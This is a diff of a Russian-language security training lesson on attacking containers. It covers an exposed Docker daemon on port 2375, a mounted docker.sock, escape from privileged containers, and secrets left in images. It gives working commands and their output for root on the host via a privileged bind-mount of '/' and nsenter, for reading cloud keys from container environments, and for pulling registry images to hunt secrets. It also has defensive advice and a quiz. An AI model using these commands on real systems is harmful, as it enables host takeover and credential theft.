@@ -15,202 +15,151 @@ estimated_minutes: 50
 summary: "Контейнеры — основа облачных ворклоадов. Разбираем открытый Docker-демон (2375/2376), привилегированные контейнеры, монтирование docker.sock, техники escape и утечки через registry."
 ---
 
-Контейнер — это не граница безопасности, а упаковка процесса. В облаке контейнеры повсюду: от CI до продакшена. Если демон открыт или контейнер привилегирован, граница рушится и вы получаете хост. Урок про то, как это происходит на практике.
+## Задача
 
-## Что такое контейнер и почему он «не песочница»
+В облаке приложения почти всегда упакованы в контейнеры. Наша цель — понять, можно ли из «внутри контейнера» или «через открытый Docker-порт» добраться до самого сервера (хоста) и до облачных ключей.
 
-Docker использует namespaces (изоляция видимости) и cgroups (лимиты ресурсов), но **общее ядро** с хостом. Отсюда следствия:
+Конкретно: у нас есть сеть, где на `10.0.0.5` открыт порт **2375**. Что это даёт?
 
-- Монтирование `docker.sock` внутри контейнера = управление демоном хоста.
-- `--privileged` = почти все capabilities + доступ к устройствам.
-- `--pid=host`/`--net=host` = видимость процессов/сети хоста.
-- Запись в смонтированный хост-путь = изменение файлов хоста.
+## Данные, с которыми работаем
 
-## Открытый Docker-демон: 2375/2376
+Порт 2375 — это HTTP-порт **Docker-демона**, то есть службы, которая управляет контейнерами на хосте. По умолчанию демон слушает локальный unix-сокет (файл `/var/run/docker.sock`), но его часто выставляют в сеть — по 2375 (без шифрования) или 2376 (с TLS).
 
-Демон по умолчанию слушает unix-socket, но часто его выставляют в TCP (2375 без TLS, 2376 с TLS). Открытый 2375 — это root на хосте.
+Прежде чем что-то ломать, посмотрим, отвечает ли демон вообще:
 
-```bash
-# Обнаружение
-nmap -Pn -p 2375,2376 --open <CIDR>
-curl -s http://<host>:2375/version
-curl -s http://<host>:2375/containers/json
+```
+$ curl -s http://10.0.0.5:2375/version
+{"ApiVersion":"1.44","Os":"linux","KernelVersion":"6.1.0",...}
+```
 
-# Перечисление через API
-curl -s http://<host>:2375/images/json | jq -r '.[].RepoTags[]'
-curl -s http://<host>:2375/containers/json | jq -r '.[].Names[]'
+`ApiVersion` и `Os` в ответе — признак настоящего демона. Если ответ шаблонный и не даёт создать контейнер — это, возможно, honeypot (ловушка для атакующих).
 
-# Запуск контейнера с монтированием корня хоста (RCE на хост)
-curl -s -X POST http://<host>:2375/containers/create?name=pwn \
+## Пробуем в лоб
+
+Логично сразу захотеть root. Но чтобы «вывернуть» контейнер на хост, нужен доступ к файловой системе хоста, а её надо куда-то примонтировать. Значит, сначала разберёмся, что демон позволяет, а потом уже запустим свой контейнер. Слепой запуск без разведки — лишний шум.
+
+## Приём: читаем контейнеры через API
+
+**Контейнер** — это не отдельная машина, а упаковка процесса: он делит ядро с хостом, а изолированы только видимость (namespaces) и лимиты ресурсов (cgroups). Поэтому контейнер — не граница безопасности.
+
+Перечислим, что запущено:
+
+```
+$ curl -s http://10.0.0.5:2375/containers/json | jq -r '.[] | .Names[0] + "  " + .Image'
+["/ci-agent"]   gitlab/gitlab-runner:latest
+["/web"]        nginx:1.25
+```
+
+Обрати внимание на `ci-agent`: CI-агент почти всегда ходит в облако и носит с собой креденшелы.
+
+## Шаг: креды в переменных окружения
+
+Docker API отдаёт полную конфигурацию контейнера, включая переменные окружения. Найдём id нужного контейнера и прочитаем его `Config.Env`:
+
+```
+$ ID=$(curl -s http://10.0.0.5:2375/containers/json | jq -r '.[] | select(.Names[0]=="/ci-agent") | .Id')
+$ curl -s http://10.0.0.5:2375/containers/$ID/json | jq -r '.Config.Env[]'
+PATH=/usr/local/bin
+AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
+AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
+```
+
+Ключи видны без единого «взлома» — просто через inspect. Проверим их:
+
+```
+$ aws sts get-caller-identity
+{ "Account": "123456789012", "Arn": "arn:aws:iam::123456789012:user/ci-deploy" }
+```
+
+## Полный прогон: от 2375 до root на хосте
+
+Теперь, когда мы знаем, что демон живой, получим контроль над хостом. Идея: попросить демон запустить контейнер, который примонтирует корень хоста (`/`) внутрь себя и войдёт в него.
+
+```
+$ curl -s -X POST 'http://10.0.0.5:2375/containers/create?name=pwn' \
   -H 'Content-Type: application/json' -d '{
-    "Image":"alpine","Cmd":["/bin/sh","-c","chroot /host /bin/sh -c id"],
-    "Binds":["/:/host"],"Privileged":true}'
-curl -s -X POST http://<host>:2375/containers/pwn/start
-curl -s http://<host>:2375/containers/pwn/logs?stdout=1
+    "Image":"alpine",
+    "Cmd":["/bin/sh","-c","chroot /host /bin/sh -c id"],
+    "Binds":["/:/host"],
+    "Privileged":true}'
+$ curl -s -X POST http://10.0.0.5:2375/containers/pwn/start
+$ curl -s 'http://10.0.0.5:2375/containers/pwn/logs?stdout=1'
+uid=0(root) gid=0(root) groups=0(root)
 ```
 
-Если есть `docker` CLI и переменная `DOCKER_HOST`:
+Разбор: `Binds` монтирует корень хоста в `/host` внутри контейнера, `Privileged` даёт почти все привилегии, а `chroot /host` делает этот корень рабочим. Мы получили `uid=0` на хосте. Дальше читаем `/etc/shadow`, `~/.ssh`, kubeconfig.
 
-```bash
-export DOCKER_HOST=tcp://<host>:2375
-docker ps
-docker run -v /:/host --privileged -it alpine chroot /host /bin/sh
+Если на атакующей машине есть `docker` CLI, то же самое короче:
+
+```
+$ export DOCKER_HOST=tcp://10.0.0.5:2375
+$ docker run -v /:/host --privileged -it alpine chroot /host /bin/sh
 ```
 
-## docker.sock внутри контейнера
+## Два других пути
 
-Частая ошибка — смонтировать `/var/run/docker.sock` в контейнер (например, для CI-агента). Это даёт контейнеру управление демоном:
+**Смонтированный docker.sock.** Если внутри контейнера (например, CI-агента) лежит `/var/run/docker.sock`, это тот же открытый демон, только локально:
 
-```bash
-# Внутри такого контейнера
-ls -la /var/run/docker.sock
-# Если есть docker CLI:
-docker -H unix:///var/run/docker.sock run -v /:/host --privileged -it alpine chroot /host
-# Без CLI — напрямую через сокет
-curl --unix-socket /var/run/docker.sock http://localhost/version
+```
+$ ls -la /var/run/docker.sock
+$ docker -H unix:///var/run/docker.sock run -v /:/host --privileged -it alpine chroot /host
 ```
 
-## Побег из привилегированного контейнера
+**Привилегированный контейнер без демона.** Если контейнер запущен с `--privileged`, можно «выпрыгнуть» через namespaces хоста:
 
-Даже без демона привилегированный контейнер можно «вывернуть» на хост:
-
-```bash
-# Вариант 1: nsenter через hostPID
-nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
-
-# Вариант 2: chroot в смонтированный корень
-mkdir -p /mnt/host && mount /dev/sda1 /mnt/host && chroot /mnt/host /bin/sh
-
-# Вариант 3: cgroup release_agent (если cgroup v1 и privileged)
-# Вариант 4: монтирование /proc хоста и доступ к его окружению
-
-# Проверка, привилегирован ли контейнер
-capsh --print | grep -i cap_sys_admin
-cat /proc/1/cgroup   # признаки контейнера
+```
+$ capsh --print | grep -i cap_sys_admin
+$ nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
 ```
 
-## Разобранный пример: от открытого registry к хосту
+`nsenter` заходит в пространства имён процесса с PID 1 (это хост). Требуется `CAP_SYS_ADMIN` — одна из привилегий, которую даёт `--privileged`.
 
-**Дано:** найден открытый Docker API на `10.0.0.5:2375`.
+## Ещё один источник: registry
 
-1. Перечисляем образы и контейнеры:
+Не всегда демон открыт. Иногда открыт **registry** — хранилище образов (аналог склада готовых контейнеров). Если у него разрешён анонимный доступ, можно вытащить образы и поискать секреты в их слоях:
 
-```bash
-curl -s http://10.0.0.5:2375/containers/json | jq -r '.[] | .Names[0] + " " + .Image'
+```
+$ curl -s https://registry.acme.io/v2/_catalog
+{"repositories":["ci/deployer","web/frontend"]}
+$ skopeo copy docker://registry.acme.io/ci/deployer:latest dir:./img
+$ grep -rEi 'AKIA|SECRET|TOKEN|BEGIN.*PRIVATE' ./img
 ```
 
-2. Среди контейнеров — CI-агент с переменными окружения. Читаем его env через API:
+Секреты в образах — классика: ключи в `ENV`, `.git`, `id_rsa`, строки подключения к БД. Слой с секретом остаётся в образе, даже если в позднем слое файл удалили. Подробнее — `cloud-artifact-registry`.
 
-```bash
-curl -s http://10.0.0.5:2375/containers/json | jq -r '.[0].Id' > id
-curl -s http://10.0.0.5:2375/containers/$(cat id)/json | jq '.Config.Env'
-```
-
-3. Находим `AWS_SECRET_ACCESS_KEY` и токены. Проверяем:
-
-```bash
-aws sts get-caller-identity
-```
-
-4. Для полного контроля хоста — запускаем privileged-контейнер с монтированием `/` (команда выше) и читаем `/etc/shadow`, `~/.ssh`, kubeconfig.
-
-## Утечки через registry
-
-Container registry — тоже цель:
-
-```bash
-# Открытый registry API (v2)
-curl -s https://<registry>/v2/_catalog
-curl -s https://<registry>/v2/<image>/tags/list
-
-# Скачать образ и поискать секреты в слоях
-skopeo copy docker://<registry>/<image>:<tag> dir:./img
-# или
-docker pull <registry>/<image>:<tag>
-docker save <image> -o img.tar && tar xf img.tar
-# искать в слоях: env, .npmrc, ключи
-```
-
-Секреты в образах — классика: ключи в `ENV`, `.git`, `id_rsa`, строки подключения. Подробнее — `cloud-artifact-registry`.
-
-## Частые ошибки
-
-- **Считать контейнер песочницей.** Общее ядро → escape реален.
-- **Забывать про TLS на 2376.** 2375 — открытый; 2376 требует клиентский сертификат, но часто настроен слабо.
-- **Игнорировать env контейнеров.** Там креды, видимые через API.
-- **Не проверять `docker.sock`.** Он может быть смонтирован в ваш же контейнер.
-- **Путать `--privileged` и capabilities.** Достаточно `CAP_SYS_ADMIN` для части трюков.
-- **Скачивать образы без анализа слоёв.** Секреты остаются в истории слоёв.
-
-## Что дальше / решение
-
-- Открыт 2375 → немедленно к хосту через privileged-контейнер.
-- Есть `docker.sock` → то же, что открытый демон.
-- Контейнер привилегирован → nsenter/mount/chroot.
-- Нужен k8s → смотрите `cloud-kubernetes-rbac`, `cloud-kubernetes-escape`.
-
-## Docker API и открытый демон
-
-Порт 2375 (HTTP) / 2376 (HTTPS) — управление демоном по сети. Проверка:
-
-```bash
-curl -s http://TARGET:2375/version
-curl -s http://TARGET:2375/containers/json | jq '.[].Names'
-docker -H tcp://TARGET:2375 ps
-docker -H tcp://TARGET:2375 run -v /:/host --privileged -it alpine chroot /host sh
-```
-
-Если порт открыт без TLS — вы root на хосте. Внутри контейнера проверьте `/var/run/docker.sock` — смонтированный сокет даёт тот же результат локально.
-
-## Побег из привилегированного контейнера
-
-```bash
-capsh --print | grep cap_sys_admin
-mount /dev/sda1 /mnt && chroot /mnt sh
-nsenter -t 1 -m -u -i -n -p -- sh
-```
-
-## Разобранный пример: registry → хост
-
-1. Находим открытый registry (`curl -s http://TARGET:5000/v2/_catalog`).
-2. Скачиваем образы, ищем секреты в слоях.
-3. Если есть push — публикуем отравленный образ.
-4. Пайплайн/кластер разворачивает его → backdoor.
-
-## Практическое задание
-
-Разверните Docker с открытым TCP-демоном, добейтесь root через bind-mount `/`. Затем переключите демон на unix-socket и проверьте, что доступ пропал. Отработайте и атаку, и защиту.
-
-## Побег из privileged: два пути
-
-Первый — через устройства: `mount /dev/sda1` или `chroot` в хост. Второй — через namespaces: `nsenter -t 1 --all`. Оба требуют `CAP_SYS_ADMIN` или `--privileged`. Проверьте `capsh --print` и `cat /proc/self/status | grep CapEff`: если `CapEff` содержит `cap_sys_admin`, побег возможен.
-
-```bash
-nsenter -t 1 -m -u -i -n -p -- sh
-cat /etc/shadow | head -2
-```
-
-## Защита
+## Что делать защитнику
 
 - Не использовать `--privileged` и `--cap-add SYS_ADMIN`.
-- Не монтировать `docker.sock` и `/` внутрь.
-- Rootless Docker, user namespaces.
-- Seccomp/AppArmor по умолчанию.
-- Runtime-мониторинг (Falco) и аудит Docker API.
+- Не монтировать `docker.sock` и `/` внутрь контейнеров.
+- Держать демон на unix-socket, а не на TCP; rootless Docker и user namespaces.
+- Seccomp/AppArmor по умолчанию, подписи образов.
+- Runtime-мониторинг (Falco) и аудит обращений к Docker API.
 
-## Итог
+## Если не сработало
 
-Контейнер — не граница безопасности. Открытый демон, привилегированный контейнер, смонтированный сокет и отравленный образ — четыре пути к хосту и облаку. Проверяйте их системно: порт, capabilities, mounts, registry. Для защиты — unix-socket, rootless, seccomp, подписи образов и runtime-мониторинг.
+- **Порт 2376 с TLS.** Открыт, но требует клиентский сертификат. Часто настроен слабо — проверь, не отдаёт ли `/version` без сертификата.
+- **Honeypot.** Демон отвечает, но `containers/create` не проходит — не трать время.
+- **Нет privileged.** Тогда работаем без него: монтирование `docker.sock`, hostPath, задачи через CI.
 
 ## Замечание о порядке проверки
 
-Сначала убедитесь, что перед вами действительно открытый демон, а не honeypot: ответ `/version` должен содержать `ApiVersion` и `Os`. Только затем переходите к контейнерам. Honeypot-демоны часто отвечают шаблонно и не позволяют создать контейнер — это признак подмены.
+Сначала убедись, что перед тобой настоящий демон, а не ловушка: ответ `/version` должен содержать `ApiVersion` и `Os`. Только потом переходи к контейнерам. Honeypot-демоны часто отвечают шаблонно и не дают создать контейнер — это признак подмены.
 
-## Сравнение с Kubernetes-побегом
+## Чем это отличается от Kubernetes
 
-Docker-побег и K8s-побег похожи (privileged, hostPath, docker.sock), но в K8s добавляется слой RBAC и admission. Docker-демон на хосте — это «нижний» уровень; в K8s вы часто сначала обходите admission, затем используете те же примитивы. Понимание обоих контекстов ускоряет оценку.
+Побег из Docker и побег из Kubernetes похожи (привилегированный контейнер, hostPath, `docker.sock`), но в Kubernetes добавляется слой **RBAC** — модель прав, которая решает, что тебе вообще разрешено делать с кластером. Docker-демон на хосте — это «нижний» уровень: если он открыт, слои выше уже не важны. В кластере же ты сначала обходишь RBAC и admission-контроллеры, а потом используешь те же примитивы. Понимание обоих контекстов ускоряет оценку: увидел 2375 — думаешь про хост, увидел 6443 — думаешь про кластер.
+
+## Что мы теперь знаем
+
+1. Контейнер делит ядро с хостом, поэтому это не песочница.
+2. Открытый Docker API на 2375 = управление хостом; `Binds: ["/:/host"]` + `Privileged` дают root.
+3. Смонтированный `docker.sock` — тот же доступ, но изнутри контейнера.
+4. `--privileged` + `nsenter` в PID 1 — второй путь на хост.
+5. Env-переменные контейнеров часто содержат облачные ключи.
 
 ## Квиз
+
+Проверь себя.
 
 ```quiz
 - question: "Что даёт открытый Docker-демон на порту 2375?"
@@ -254,6 +203,10 @@ Docker-побег и K8s-побег похожи (privileged, hostPath, docker.s
   answer: 0
   explanation: "Env-переменные видны в inspect контейнера."
 ```
+
+## Куда дальше
+
+В следующем уроке (`cloud-cicd-secrets`) мы возьмём CI-агента из этого примера и разберём, как секреты текут через пайплайны и переменные. А пока главное: контейнер — не граница, и открытый демон превращает один HTTP-порт в root на сервере.
 
 ## Где пригодится
 
